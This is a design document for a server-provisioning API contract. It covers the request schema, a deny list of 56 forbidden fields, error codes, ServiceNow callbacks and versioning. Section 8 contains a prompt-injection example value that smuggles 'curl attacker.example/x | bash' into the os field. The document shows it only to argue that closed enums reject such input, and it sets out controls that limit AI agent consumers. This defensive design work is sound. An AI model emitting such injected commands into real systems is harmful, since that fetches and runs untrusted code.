# API Contract

Status: **Phase 1 — Proposed**

The engine-neutral contract that ServiceNow, GitHub Actions, AAP, and any future consumer
(chatbot, AI agent, third-party API) speak. This is the durable asset of the platform: the
engines are replaceable, the contract is not
([AD-02](../architecture/architectural-decisions.md#ad-02-engine-neutral-run-contract-as-the-integration-seam),
[AD-20](../architecture/architectural-decisions.md#ad-20-additive-schema-versioning-only),
[AD-10](../architecture/architectural-decisions.md#ad-10-no-automation-gateway-service-in-v1)).

**No HTTP service is implemented in Phase 1.** The HTTP surface described in [§4 ](#4-http-api-surface-optional)
is a *mapping* of the same contract onto endpoints, specified so that a gateway can be added
later without changing any consumer. Today, ServiceNow calls an engine adapter directly.

---

## 1. The Contract

### 1.1 Run contract (request)

The **only** input to the platform. Nine fields. `additionalProperties: false`.

> **Scope in this release: GCP, on GitHub Actions.** ServiceNow, AAP/AWX, Azure and AWS are out
> of scope for now. The contract shape is unchanged by that — it stays engine-neutral and
> provider-neutral in form — so a `cloud` enum addition or an `execution_engine` value is an
> additive minor bump under [AD-20](§9-versioning), not a redesign. See
> [schemas/README.md](../../schemas/README.md).

```json
{
  "schema_version": "1.0.0",
  "request_id": "RITM0012345",
  "application": "PAYMENTS",
  "environment": "PROD",
  "cloud": "GCP",
  "region": "EU",
  "server_role": "APPLICATION",
  "os": "LINUX",
  "count": 2,
  "change_reference": "CHG0012345"
}
```

| Field | Type | Required | Constraint | Source |
|---|---|:--:|---|---|
| `schema_version` | string | yes | `^\d+\.\d+\.\d+$` | Caller |
| `request_id` | string | yes | `^[A-Z]{2,8}[0-9]{6,12}$` | Request system |
| `application` | string | yes | `^[A-Z][A-Z0-9_]{1,31}$`, must be registered in the catalogue | Requester choice |
| `environment` | string | yes | enum `DEV` \| `NONPROD` \| `PROD` | Requester choice |
| `cloud` | string | yes | enum `GCP` (this release; widening is a minor bump) | Derived |
| `region` | string | yes | `^[A-Z]{2,4}$`, must be in the app's approved footprint | Derived |
| `server_role` | string | yes | `^[A-Z][A-Z0-9_]{1,31}$`, must be registered | Requester choice |
| `os` | string | yes | enum `LINUX` \| `WINDOWS` | Requester choice |
| `count` | integer | yes | 1..16, further bounded per role and environment | Requester choice, bounded |
| `change_reference` | string | conditional | `^[A-Z]{2,8}[0-9]{6,12}$`; **required** when `environment` is `PROD` | Derived |

The id and change patterns are deliberately looser than the ServiceNow-specific `^RITM[0-9]{10}$`
and `^CHG[0-9]{10}$` they replace, so that the contract is not coupled to one originating system's
numbering. ServiceNow, if reintroduced, still satisfies them.

### 1.2 Fields that are explicitly forbidden

Each appears in the schema as `false`, so a consumer that tries one gets a message naming it
([security-architecture.md §4.2 ](../security/security-architecture.md#42-the-schema-is-the-control)):

```
project                 region_name             zone
availability_zone       machine_type            instance_name
hostname                short_name              fqdn
subnet                  subnet_id               network
network_tags            service_account         external_ip
image_id                image_reference         image_family
latest                  disk_type               disk_size
labels                  annotations             metadata
shielded_vm             confidential_computing  guest_os_features
vm_size                 vpc_id                  vnet_id
security_group          security_group_ids      dns_server
domain_controller       ou                      domain_ou
monitoring_config       backup_config           agent_config
credentials             cloud_credentials       service_account_key
access_token            account                 subscription
resource_group          tags                    naming
extra_vars              commands                playbook
script                  run_context             context
resolved_config         overrides
```

**56 properties are forbidden.** The list above is generated from
`schemas/business-request.schema.json` and is asserted against it by a conformance test, so it
cannot drift from what the schema actually rejects. `vm_size: false` is the clearest example of §2
of the bootstrap being enforced rather than
merely documented.

### 1.3 Who supplies what, and why

| Field | Caller supplies | Platform | Rationale |
|---|:--:|:--:|---|
| `application` | choice | validates against the catalogue | Business intent |
| `environment` | choice | validates; applies the policy floor | Business intent + a control boundary |
| `cloud`, `region` | — (ServiceNow derives) | validates against the app's footprint | Not a user decision; an app lives in an approved footprint ([AD-19](../architecture/architectural-decisions.md#ad-19-derived-fields-are-resolved-server-side-by-servicenow)) |
| `server_role` | choice | validates | Business intent |
| `os` | choice | validates; applies the image/classification floor | Business intent, with a technical consequence |
| `count` | bounded number | validates against the per-role maximum | Business intent, operationally bounded |
| `request_id` | — | idempotency key | Platform identity, not user input |
| `change_reference` | — (ServiceNow derives) | requires non-empty in `PROD`; optionally re-verifies | Governance ([AD-17](../architecture/architectural-decisions.md#ad-17-approval-authority-stays-in-servicenow)) |
| `requested_by` | **absent** | reads from ServiceNow on demand | Derived in ServiceNow; excluded from the wire to avoid propagating PII into tags, logs and the state store ([AD-19](../architecture/architectural-decisions.md#ad-19-derived-fields-are-resolved-server-side-by-servicenow)) |

### 1.4 Resolved configuration (internal)

Produced by the resolver, stored in `context.json`, never sent to a requester in full.
Full structure: [configuration-resolution.md §4 ](../architecture/configuration-resolution.md#4-precedence-and-merge-semantics-in-practice).
Schema: `schemas/run-context.schema.json`.

### 1.5 Stage result

```json
{
  "schema_version": "1.0.0",
  "request_id": "RITM0012345",
  "correlation_id": "0192f3a4-7b8c-7d1e-9f20-1a2b3c4d5e6f",
  "run_id": "0192f3a4-7b8c-7d1e-9f20-1a2b3c4d5e70",
  "stage": "domain_join",
  "attempt": 2,
  "status": "PARTIAL",
  "started_at": "2026-09-14T09:41:02Z",
  "finished_at": "2026-09-14T09:47:55Z",
  "duration_s": 413,
  "sba_git_sha": "3f9a1c2e4b7d8a0f1e2c3b4a5d6e7f8091a2b3c4d",
  "sba_ee_digest": "sha256:4f1e…",
  "hosts": [
    { "sba_instance_id": "9b1d…", "short_name": "pypa001", "status": "SUCCESS",
      "changed": true, "duration_s": 198 },
    { "sba_instance_id": "4c7e…", "short_name": "pypa002", "status": "FAILED",
      "changed": false, "duration_s": 215,
      "error": { "code": "DOMAIN_DC_UNREACHABLE", "retryable": true,
                 "message": "No domain controller responded within the timeout",
                 "stage_detail": "system.domain_join" } }
  ],
  "diagnostics": [],
  "remediation": {
    "recommand": "ansible-playbook playbooks/server_build.yml -e @context.json -e '{\"stage\":\"domain_join\"}'",
    "note": "Re-running this stage is safe and will not re-provision."
  }
}
```

The `remediation` block is what turns a failure into a resolution. A requester who is told only
"FAILED" files a ticket; one who is told "re-run stage 4, here is the command, it will not
create anything new" fixes it themselves. This is the direct payoff of stage independence
([AD-01](../architecture/architectural-decisions.md#ad-01-single-entry-playbooks--staged-re-entry)) and of
[AD-16](../architecture/architectural-decisions.md#ad-16-forward-fix-over-auto-destroy).

### 1.6 Final result (roll-up)

```json
{
  "schema_version": "1.0.0",
  "request_id": "RITM0012345",
  "correlation_id": "0192f3a4-7b8c-7d1e-9f20-1a2b3c4d5e6f",
  "run_id": "0192f3a4-7b8c-7d1e-9f20-1a2b3c4d5e70",
  "status": "PARTIAL",
  "execution_engine": "AAP",
  "execution_url": "https://aap.corp.example.com/api/controller/jobs/4821/",
  "started_at": "2026-09-14T09:12:44Z",
  "finished_at": "2026-09-14T09:52:10Z",
  "build_duration_s": 2366,
  "code": { "sba_git_sha": "3f9a1c2e…", "sba_ee_digest": "sha256:4f1e…",
            "catalog_version": "2026.09.1" },
  "image_version": "windows-2025-enterprise:12.3",
  "summary": {
    "provider": "azure", "location": "westeurope",
    "compute_class": "Standard_D4s_v6", "os_version": "Windows Server 2025 10.0.20348",
    "policies_applied": ["production", "enterprise", "cis_windows_2025_1"],
    "resolved_config_hash": "sha256:a71b…"
  },
  "servers": [
    { "sba_instance_id": "9b1d…", "short_name": "pypa001",
      "fqdn": "pay-prod-app-ams-001.corp.example.com", "private_ip": "10.20.31.14",
      "cloud_resource_id": "/subscriptions/…/virtualMachines/pay-prod-app-ams-001",
      "build_status": "SUCCESS", "post_build_status": "PARTIAL",
      "cmdb_ci_sys_id": "8f3c…", "ad_computer_dn": "CN=pypa001,OU=Servers,OU=Payments,DC=corp,DC=example,DC=com" }
  ],
  "stages": [
    { "stage": "validate",   "status": "SUCCESS", "duration_s": 12 },
    { "stage": "provision",  "status": "SUCCESS", "duration_s": 214 },
    { "stage": "os_config",  "status": "SUCCESS", "duration_s": 1187 },
    { "stage": "validate_os","status": "SUCCESS", "duration_s": 74 },
    { "stage": "domain_join","status": "PARTIAL", "duration_s": 413 },
    { "stage": "install_agents", "status": "SUCCESS", "duration_s": 341 },
    { "stage": "dns",        "status": "SUCCESS", "duration_s": 22 },
    { "stage": "cmdb",       "status": "SUCCESS", "duration_s": 9 }
  ],
  "error": { "code": "DOMAIN_DC_UNREACHABLE", "retryable": true,
             "message": "1 of 2 servers failed domain join",
             "detail_source": "context.json#/stages/domain_join" },
  "remediation": { "recommand": "…", "note": "Infrastructure retained by policy" }
}
```

---

## 2. Status Vocabulary

One vocabulary, shared by every component, additive-only
([AD-20](../architecture/architectural-decisions.md#ad-20-additive-schema-versioning-only)). Full definitions
and roll-up rules: [request-lifecycle.md §2 ](../architecture/request-lifecycle.md#2-status-model).

| Status | Terminal | In a stage result | In a final result |
|---|:--:|:--:|:--:|
| `RECEIVED` | no | — | yes |
| `QUEUED` | no | — | yes |
| `RESOLVING` | no | — | yes |
| `VALIDATING` | no | — | yes |
| `IN_PROGRESS` | no | — | yes |
| `STAGE_COMPLETE` | no | — | yes |
| `SUCCESS` | **yes** | yes | yes |
| `PARTIAL` | yes (resumable) | yes | yes |
| `FAILED` | **yes** | yes | yes |
| `VALIDATION_FAILED` | **yes** | yes | yes |
| `POLICY_BLOCKED` | **yes** | yes | yes |
| `APPROVAL_FAILED` | **yes** | yes | yes |
| `CANCELLING` | no | — | yes |
| `CANCELLED` | **yes** | yes | yes |
| `MANUAL_ATTENTION` | no (awaiting a human) | yes | yes |

`PARTIAL` is a **first-class terminal state that is also resumable**, and the distinction
matters: it is terminal for the automation (nothing further will happen automatically) and
resumable for a human (re-running one stage continues from where it stopped). Mapping it to a
single boolean — terminal or not — loses that, and is the most likely implementation mistake in
the ServiceNow flow.

`APPROVAL_FAILED` is reserved for the optional production approval re-verification. Technical
policy failures are `POLICY_BLOCKED` ([C-17](../architecture/architectural-decisions.md#2-requirement-conflict-register)).

---

## 3. Error Model

### 3.1 Shape

```json
{
  "code": "SUBNET_IP_EXHAUSTED",
  "retryable": false,
  "message": "Subnet snet-payments-prod-app has 1 free address; 2 requested.",
  "actionable": "Reduce count to 1, or request a subnet range extension through the
                 network change process (ref NET-CHG-8841).",
  "detail_source": "context.json#/preflight/13",
  "stage": "validate"
}
```

| Field | Required | Purpose |
|---|:--:|---|
| `code` | yes | Stable, machine-readable. Never localised, never reworded |
| `retryable` | yes | Drives automatic retry ([failure-and-retry.md §4 ](../architecture/failure-and-retry.md#4-retry-classification)) |
| `message` | yes | What happened. Built from a **closed template set**; never a raw exception, never a secret, never a value from configuration that could be sensitive |
| `actionable` | yes, for requester-facing errors | What to do instead. This is what prevents a ticket |
| `detail_source` | yes, for requester-facing errors | A pointer into `context.json` for an operator. The detail is *referenced*, not inlined, so the response stays small and does not leak topology |
| `stage` | yes | Which stage |

### 3.2 Error code registry

Codes are **stable identifiers**. A code is never renamed or repurposed; a retired code becomes
`RESERVED`. Consumers may switch on them.

| Code | Retryable | Category | Stage |
|---|:--:|---|---|
| `SCHEMA_INVALID` | no | contract | intake |
| `UNSUPPORTED_ENUM_VALUE` | no | contract | intake |
| `UNSUPPORTED_SCHEMA_VERSION` | no | contract | intake |
| `CONTRACT_FORBIDDEN_FIELD` | no | contract | intake |
| `REQUEST_MODIFIED` | no | idempotency | intake |
| `NO_APPROVED_CONFIGURATION` | no | resolution | resolve |
| `PRECEDENCE_CONFLICT` | no | resolution | resolve |
| `RESOLUTION_CONFLICT` | no | resolution | resolve |
| `IMAGE_NOT_FOUND` | no | resolution | resolve |
| `IMAGE_NOT_APPROVED` | no | resolution | resolve |
| `IMAGE_EXPIRED` | no | resolution | resolve |
| `NAME_UNRESOLVABLE` | no | naming | resolve |
| `NAME_TAKEN` | no | naming | validate |
| `TAG_MAPPING_INCOMPLETE` | no | tagging | resolve |
| `POLICY_VIOLATION` | no | policy | resolve |
| `APPROVAL_FAILED` | no | policy | validate |
| `CHANGE_FREEZE_ACTIVE` | no | policy | validate |
| `COMPLIANCE_MISSING` | no | policy | validate |
| `INDETERMINATE_AT_PREFLIGHT` | no | preflight | validate |
| `REGION_NOT_AVAILABLE` | no | cloud | validate |
| `SIZE_NOT_AVAILABLE_IN_REGION` | no | cloud | validate |
| `SCOPE_NOT_ACCESSIBLE` | no | cloud | validate |
| `PARENT_SCOPE_MISSING` | no | cloud | validate |
| `NETWORK_MISMATCH` | no | cloud | validate |
| `SUBNET_IP_EXHAUSTED` | no | cloud | validate |
| `SECURITY_POLICY_MISSING` | no | cloud | validate |
| `QUOTA_EXCEEDED` | no | cloud | validate |
| `IMAGE_REVOKED` | no | security | validate |
| `RUNNER_NOT_REACHABLE` | **yes** | connectivity | validate |
| `IDENTITY_UNAVAILABLE` | **yes** | identity | any |
| `SOURCE_UNAVAILABLE` | **yes** | supply chain | any |
| `EE_UNAVAILABLE` | **yes** | supply chain | any |
| `STATE_STORE_UNAVAILABLE` | **yes** | platform | any |
| `CLOUD_API_TIMEOUT` | **yes** | cloud | provision |
| `CLOUD_API_THROTTLED` | **yes** | cloud | provision |
| `RESOURCE_CONFLICT` | **yes** | cloud | provision |
| `AMBIGUOUS_RESOURCE` | no | cloud | provision |
| `IMMUTABLE_MISMATCH` | no | cloud | provision |
| `PROVISION_FAILED` | varies | cloud | provision |
| `TAG_WRITE_INCOMPLETE` | no | tagging | provision |
| `HOST_UNREACHABLE` | **yes** | connectivity | os_config + |
| `WINRM_NOT_READY` | **yes** | connectivity | os_config |
| `SSH_NOT_READY` | **yes** | connectivity | os_config |
| `GUEST_AGENT_TIMEOUT` | **yes** | guest | os_config |
| `REBOOT_TIMEOUT` | **yes** | guest | os_config |
| `OS_VERSION_MISMATCH` | no | validation | validate_os |
| `BASELINE_DRIFT` | no | validation | validate_os |
| `DOMAIN_DC_UNREACHABLE` | **yes** | directory | domain_join |
| `DOMAIN_JOIN_TIMEOUT` | **yes** | directory | domain_join |
| `DOMAIN_CREDENTIAL_INVALID` | no | directory | domain_join |
| `DOMAIN_OU_NOT_FOUND` | no | directory | domain_join |
| `AGENT_INSTALL_FAILED` | **yes** | agent | install_agents |
| `AGENT_NOT_ENROLLED` | **yes** | agent | install_agents |
| `AGENT_NOT_REPORTING` | **yes** | agent | install_agents |
| `DNS_RECORD_CONFLICT` | no | dns | dns |
| `DNS_ZONE_NOT_FOUND` | no | dns | dns |
| `DNS_PROPAGATION_TIMEOUT` | **yes** | dns | dns |
| `CMDB_WRITE_FAILED` | **yes** | cmdb | cmdb |
| `CMDB_DUPLICATE_DETECTED` | no | cmdb | cmdb |
| `TIMEOUT` | no | platform | any |
| `CANCELLED` | no | platform | any |
| `RESOLVER_ERROR` | no | platform | resolve |
| `INTERNAL_ERROR` | no | platform | any |

Two conventions worth stating because they are easy to get wrong:

- **`retryable` is a property of the condition, not of the stage.** `DOMAIN_DC_UNREACHABLE` is
  retryable and `DOMAIN_CREDENTIAL_INVALID` is not, and they are one stage. Classifying by stage
  would get this wrong.
- **`AGENT_NOT_REPORTING` is retryable, not fatal.** An agent that installed but has not yet
  heartbeated is usually a propagation delay. Treating it as fatal would fail builds that
  produced correctly configured servers, and — because
  [AD-16](../architecture/architectural-decisions.md#ad-16-forward-fix-over-auto-destroy) retains
  infrastructure — would create a `PARTIAL` on an entirely healthy estate.

---

## 4. HTTP API Surface (optional)

**Not implemented in Phase 1.** Specified so a gateway can be added additively
([AD-10](../architecture/architectural-decisions.md#ad-10-no-automation-gateway-service-in-v1)).

### 4.1 When this becomes necessary

| Trigger | Notes |
|---|---|
| A chatbot or AI agent consumer goes live | The primary driver — they cannot speak either engine API |
| More than ~5 distinct callers | Central validation and rate limiting starts to pay for itself |
| A compliance requirement for a single network entry point | Audit or network-segmentation driver |
| Cross-engine concurrency control outgrows the state store | |
| A third party needs a supported interface | Commercial driver |

Until then, ServiceNow calls the engine adapter directly and this section is documentation
rather than code.

### 4.2 Endpoints

```
  POST   /v1/server/build                 start or resume a build from a run contract
  POST   /v1/server/destroy               tear down a build (separately approved)
  POST   /v1/server/validate              dry-run: resolve + policy + pre-flight, no mutation
  POST   /v1/server/post-build            stages 4-7 on an existing fleet
  GET    /v1/server/{request_id}          the full run record
  GET    /v1/server/{request_id}/status   current status (cheap, pollable)
  GET    /v1/server/{request_id}/result   the final result, or null if not terminal
  GET    /v1/server/{request_id}/stages   per-stage results
  POST   /v1/server/{request_id}/cancel   request cancellation
  GET    /v1/healthz                      liveness
  GET    /v1/readyz                       readiness (state store reachable)
```

### 4.3 Cross-cutting requirements

| Requirement | Implementation |
|---|---|
| **Authentication** | OAuth2 client credentials, per consumer. mTLS where the enterprise standard requires it ([OQ-09](../open-questions.md#2-important--an-answer-is-needed-before-phase-4)) |
| **Authorization** | Per-consumer scopes: `build:create`, `build:read`, `build:cancel`, `destroy:create`. RBAC bound to the resolved environment — a `dev` consumer cannot build in `prod` |
| **Schema validation** | The run contract, before anything else. An invalid contract is a `422` with the field-level reason |
| **Rate limiting** | Per consumer and per environment. Returns `429` with `Retry-After` |
| **Idempotency** | `Idempotency-Key` header, defaulting to `request_id`. `200` + existing resource on a repeat; `409` on a modified contract |
| **Correlation IDs** | `X-Correlation-Id` accepted and echoed; generated if absent. Propagated into every log line, tag and callback |
| **Audit logging** | Every request logged with consumer identity, contract hash, outcome, and duration |
| **RBAC** | As above; the consumer identity is never taken from the request body |

### 4.4 Response semantics

```
  POST /v1/server/build

  202 Accepted
  {
    "request_id": "RITM0012345",
    "status": "QUEUED",
    "execution_engine": "AAP",
    "execution_id": "4821",
    "correlation_id": "0192f3a4-…",
    "links": { "self": "/v1/server/RITM0012345",
               "status": "/v1/server/RITM0012345/status",
               "result": "/v1/server/RITM0012345/result" }
  }

  200 OK            (Idempotency-Key already processed) — same body, plus "duplicate": true
  400 Bad Request   malformed JSON
  401 Unauthorized  bad or missing token
  403 Forbidden     the consumer may not build in this environment
  409 Conflict      same request_id, different contract  -> REQUEST_MODIFIED
  422 Unprocessable contract is well-formed but invalid    -> SCHEMA_INVALID / UNSUPPORTED_ENUM_VALUE
  429 Too Many      rate limited                          -> Retry-After
  503 Unavailable   state store unreachable
```

`202` rather than `200` because the build is asynchronous by design; a synchronous build endpoint
would need a multi-hour timeout, which no HTTP client should be asked to hold.

### 4.5 Engine dispatch is an implementation detail

A response never says "GitHub Actions" or "AAP" as a *requirement* — it reports
`execution_engine` as an observation. This is what allows
[AD-09](../architecture/architectural-decisions.md#ad-09-per-environment-engine-routing) to change without
any consumer changing. A consumer that branches on the engine value is a consumer that has
coupled itself to an implementation detail, and that is worth stating in the API documentation
because it is a mistake a consumer will otherwise make.

---

## 5. ServiceNow Field Mapping

### 5.1 ServiceNow → contract

| ServiceNow source | Contract field | Notes |
|---|---|---|
| `sys_id` (of the RITM) / number | `request_id` | Canonical. Not user-supplied |
| Catalog variable `application` | `application` | Choice from the app register |
| Catalog variable `environment` | `environment` | Choice from the env register |
| Application's approved footprint | `cloud`, `region` | **Derived in ServiceNow.** Shown in the form as read-only, for the requester's information |
| Catalog variable `server_role` | `server_role` | Choice from the role register |
| Catalog variable `os` | `os` | Choice from the OS register |
| Catalog variable `count` (Dynamic Quantity) | `count` | Bounded per role and environment |
| Linked CHG on the RITM | `change_reference` | **Derived in ServiceNow**; required when `environment = PROD` |
| Catalog item / flow version | `schema_version` | Pinned by the catalog item version, not user input |
| *(not sent)* | `requested_by` | Read from the RITM on demand. Excluded from the wire ([AD-19](../architecture/architectural-decisions.md#ad-19-derived-fields-are-resolved-server-side-by-servicenow)) |

### 5.2 Contract → ServiceNow (callback)

| Response field | ServiceNow target | Notes |
|---|---|---|
| `request_id` | RITM work note / task record | The join key |
| `status` | **RITM state** | `SUCCESS` → "Completed"; `PARTIAL`/`MANUAL_ATTENTION` → "Manual Attention"; `VALIDATION_FAILED`/`POLICY_BLOCKED` → "Failed - Configuration"; `CANCELLED` → "Cancelled" |
| `execution_url` | Work note (hyperlink) | Operator access to the job |
| `correlation_id`, `run_id` | Work note | For cross-referencing a log |
| `servers[].sba_instance_id` | CI `u_sba_instance_id` field | The golden join key ([AD-05](../architecture/architectural-decisions.md#ad-05-sba_instance_id-is-the-golden-join-key)) |
| `servers[].short_name`, `fqdn`, `private_ip` | CI fields | Server identity |
| `servers[].cloud_resource_id` | CI field | Provider-specific |
| `servers[].cmdb_ci_sys_id` | RITM–CI relationship | Created by Stage 7 |
| `image_version` | CI image field | |
| `summary.os_version`, `compute_class`, `location` | CI fields | Summary only |
| `summary.resolved_config_hash` | RITM field | Links the RITM to the stored context without exposing it |
| `code.sba_git_sha`, `sba_ee_digest` | CI + RITM work note | Reproducibility |
| `stages[]` | RITM work note (formatted) | Per-stage outcome |
| `error.code`, `error.message`, `error.actionable` | RITM work note + state | The actionable message goes in the work note, verbatim |
| `remediation.recommand` | RITM work note | The operator's next action, ready to run |

### 5.3 What is deliberately **not** written to ServiceNow

| Not sent | Why |
|---|---|
| Subscription / project ID | Estate topology in a widely-readable surface |
| VNet / VPC / subnet IDs and CIDRs | Same |
| Image resource IDs | `image_version` is sufficient and far more readable |
| OU distinguished name, domain name | The FQDN already implies the zone |
| NSG / security group rule details | Infrastructure detail with no requester value |
| `context.json` in full | Classified as sensitive ([security-architecture.md §5 ](../security/security-architecture.md#5-data-protection)) |
| Any credential | None exists to send ([AD-15](../architecture/architectural-decisions.md#ad-15-no-secrets-in-extra_vars--workflow-inputs)) |

`resolved_config_hash` is what makes this safe: an auditor can confirm the RITM and the stored
context correspond, without the topology leaving the run-state store
([request-lifecycle.md §7.1 ](../architecture/request-lifecycle.md#71-why-the-ritm-never-contains-the-technical-result-in-full)).

---

## 6. Callback Contract

### 6.1 Transport

| Property | Value |
|---|---|
| Direction | Engine adapter → ServiceNow |
| Method | `POST` |
| Content type | `application/json` |
| Authentication | OAuth2 client credentials (`svc-sba-servicenow-cmdb` scope limited to the callback endpoint), plus a request signature |
| TLS | 1.2+; mTLS where the enterprise standard requires it ([OQ-09](../open-questions.md#2-important--an-answer-is-needed-before-phase-4)) |
| Retry | Adapter-side, exponential backoff, 5 attempts, jitter |
| Ingress | A ServiceNow Scripted REST API, or a MID Server transform where the enterprise pattern requires a MID Server ([OQ-09](../open-questions.md#2-important--an-answer-is-needed-before-phase-4)) |

### 6.2 Signature

```
  canonical = method + "\n" + path + "\n" + timestamp + "\n" + sha256(body)
  header    X-SBA-Signature: v1=<hex hmac-sha256 of canonical, keyed by the shared secret>
  header    X-SBA-Timestamp:  2026-09-14T09:52:10Z
```

Two independent checks: the OAuth2 token proves *who* is calling, and the signature proves the
body has not been altered in transit. Rejecting a request older than 5 minutes prevents replay,
and the idempotency key below handles the residual case where a legitimate callback is
re-delivered.

### 6.3 Idempotency

```
  key = sha256(request_id + stage + status + attempt)
```

Applying the same callback twice is a no-op. This matters because at-least-once delivery is the
norm for any callback with retries, and a naive implementation would append a duplicate stage
history entry to the RITM on every re-delivery — a small bug that produces a very confusing
audit record.

### 6.4 Payload

```json
{
  "schema_version": "1.0.0",
  "request_id": "RITM0012345",
  "correlation_id": "0192f3a4-…",
  "run_id": "0192f3a4-…",
  "status": "PARTIAL",
  "terminal": true,
  "stage": "report",
  "attempt": 2,
  "timestamp": "2026-09-14T09:52:10Z",
  "execution_engine": "AAP",
  "execution_url": "https://aap.corp.example.com/api/controller/jobs/4821/",
  "build_duration_s": 2366,
  "image_version": "windows-2025-enterprise:12.3",
  "resolved_config_hash": "sha256:a71b…",
  "code": { "sba_git_sha": "3f9a1c2e…", "sba_ee_digest": "sha256:4f1e…" },
  "servers": [ … §1.6 … ],
  "stages": [ … §1.6 … ],
  "error": { "code": "DOMAIN_DC_UNREACHABLE", "retryable": true,
             "message": "1 of 2 servers failed domain join",
             "actionable": "Verify DC reachability from the app subnet, then re-run
                            stage domain_join. No infrastructure will be recreated." },
  "remediation": { "recommand": "…", "note": "Infrastructure retained by policy" }
}
```

Intermediate (non-terminal) callbacks are also sent, so a long build can update the RITM work
note without ServiceNow polling. They carry `terminal: false` and a subset of fields.

### 6.5 ServiceNow's obligations

| Obligation | Reason |
|---|---|
| Apply updates idempotently, keyed on the idempotency hash | Re-delivery is expected |
| Never trust a callback that is unsigned or mis-signed | It is a mutation endpoint |
| Never accept a callback for a `request_id` outside the integration's scope | A compromised adapter must not update arbitrary RITMs |
| Map `PARTIAL` to a **distinct** state, not to "Failed" | [AD-16](../architecture/architectural-decisions.md#ad-16-forward-fix-over-auto-destroy): mapping it to Failed invites deletion of the RITM, orphaning retained infrastructure |
| Store `error.actionable` in the work note verbatim | It is written for the requester |
| Run the reconciliation job independently | The callback is an optimisation, not the mechanism ([request-lifecycle.md §8 ](../architecture/request-lifecycle.md#8-status-reconciliation)) |

---

## 7. Polling Contract

Where an engine's status must be read rather than pushed.

| Engine | Endpoint | Note |
|---|---|---|
| AAP | `GET /api/controller/unified_jobs/{id}/` | Use the **unified job** id from the launch response, consistently. The launch response's `id` is a *job* id and the two are not interchangeable |
| GitHub Actions | `GET /repos/{o}/{r}/actions/runs/{id}` | A dispatch returns no id; it is resolved from the `Location` header or a filtered query ([servicenow-github-actions.md §3.3 ](../architecture/servicenow-github-actions.md#33-dispatch-call)) |

**Adapter responsibilities.** Poll with backoff (30 s, 60 s, 120 s, 300 s, then 300 s), cap at
the stage's p95 budget + 50%, treat a poll failure as a poll failure rather than a job failure,
and — critically — **read the result artifact, not the engine's status field**
([AD-14](../architecture/architectural-decisions.md#ad-14-result-delivery-via-artifacts-never-log-scraping)).
The engine status is transport metadata; `run_result.json` is written by the component that
did the work.

**Reconciliation is independent of both.** A ServiceNow scheduled job reads the run-state store
directly, so a Flow Designer bug or an adapter outage delays status but never loses it
([request-lifecycle.md §8 ](../architecture/request-lifecycle.md#8-status-reconciliation)).

---

## 8. AI and Chatbot Consumers

§29 requires forward compatibility. It is structural
([AD-02](../architecture/architectural-decisions.md#ad-02-engine-neutral-run-contract-as-the-integration-seam)).

```
  User ─▶ Chatbot / AI Agent ─▶ run contract JSON ─▶ ServiceNow ─▶ platform
                                    │
                                    └── MAY produce the 9 business fields.
                                        MAY NOT: execute Ansible, call a cloud API,
                                                 supply a technical parameter, or
                                                 receive a credential.
```

**Enforcement, not policy.** An AI agent has no way to execute Ansible, because:

1. The contract schema has no field that can carry a command, a playbook name or a script
   ([§1.2 ](#12-fields-that-are-explicitly-forbidden)).
2. `additionalProperties: false` rejects an attempt to add one, with a message naming the field.
3. Closed enums reject an out-of-set value, so a prompt-injected
   `"os": "WINDOWS; curl attacker.example/x | bash"` is a schema error, not a string that
   reaches a module.
4. The AI's output is subject to the same validation, policy gate and pre-flight as a human's
   request. It is not a privileged path.

**What the AI may do better than a form.** Conversationally: it can infer `application`,
`server_role`, `os` and `count` from a natural-language request, and propose them for
confirmation. That is a genuinely better user experience and it is safe, because the AI proposes
*business* fields and the platform decides everything technical. The AI does not bypass
approval — the request still flows through ServiceNow and its approval process
([AD-17](../architecture/architectural-decisions.md#ad-17-approval-authority-stays-in-servicenow)).

**What a future AI agent must not do**, and the control for each:

| Must not | Control |
|---|---|
| Execute Ansible or a shell command | No input field can express one |
| Supply `vm_size`, `subnet`, `image`, credentials | Forbidden properties; rejected at the boundary |
| Bypass approval | The contract is a ServiceNow request; the approval path is unchanged |
| See or request a credential | No credential is ever an input or an output ([AD-15](../architecture/architectural-decisions.md#ad-15-no-secrets-in-extra_vars--workflow-inputs)) |
| Escalate its own privilege | Its consumer identity has exactly the scopes of any other API consumer; `env: PROD` requires a scope it is not granted |
| Act on an unvalidated configuration | The policy gate and pre-flight are not optional and are not AI-aware |

The last row is the one to hold onto. **The policy/configuration engine remains the
authoritative layer, and that is a property of the type system, not a policy statement.**

---

## 9. Versioning

[AD-20](../architecture/architectural-decisions.md#ad-20-additive-schema-versioning-only).

| Rule | Detail |
|---|---|
| Format | Semver on `schema_version` |
| Minor bump | New optional fields with documented defaults. Consumers must ignore unknown fields |
| Major bump | Removing or retyping a field, changing an enum's meaning, or changing requiredness. Consumers must **reject** an unknown major |
| Enum additions | A **minor** bump. Consumers must reject an unknown enum member with `UNSUPPORTED_ENUM_VALUE` rather than passthrough — a closed set is the control that keeps a compromised or buggy consumer from injecting a value |
| Deprecation | Announced for one minor cycle, then removed in a major. Never removed in a minor |
| Compatibility testing | CI tests every supported minor version against the current code, so a consumer on an older version is a tested configuration rather than an assumption |
| Consumer registry | The set of known consumers and the contract version each uses is recorded, so a breaking change can be assessed against actual usage rather than assumed usage |

The consumer registry is the piece most often omitted and the one that turns "we changed the
contract" from an outage into a conversation.

---

## 10. Testability of the Contract

The contract is only useful if it is testable, and it is testable because it is closed.

| Test | Property proven |
|---|---|
| Schema negative cases | Every forbidden field is rejected, with a field-level message |
| Enum fuzzing | Random strings in every enum field are rejected, never passthrough |
| Injection corpus | Command, path-traversal, template and SSRF payloads in every string field are rejected or inert |
| Golden resolution files | A contract plus a catalogue version always produces the same `context.json` |
| Fingerprint stability | Identical contracts fingerprint identically; a one-field change does not |
| Callback replay | A replayed callback is a no-op; a mis-signed one is rejected |
| Callback scope | A callback for a `request_id` outside the integration's scope is rejected |
| Roll-up table | Every combination of stage and host statuses maps to the documented request status |
| Error registry | Every code is unique, has a documented retryability, and matches a template |
| Consumer compatibility | Each supported contract minor version passes against current code |
| Message sanitisation | No error message contains a secret, a file path outside the repository, or a value from configuration that is not in the allow-list |

That last test is the one that keeps [§3.1 ](#31-shape)'s "closed template set" honest. Without
it, a resolver exception leaking into a requester-facing message would be found by a user
rather than by CI.

---

## 11. Next

- Resolution internals: [configuration-resolution.md](../architecture/configuration-resolution.md)
- Lifecycle and status transitions: [request-lifecycle.md](../architecture/request-lifecycle.md)
- Schema files: [`schemas/`](../../schemas)
- Idempotency and fingerprinting: [idempotency.md](../architecture/idempotency.md)
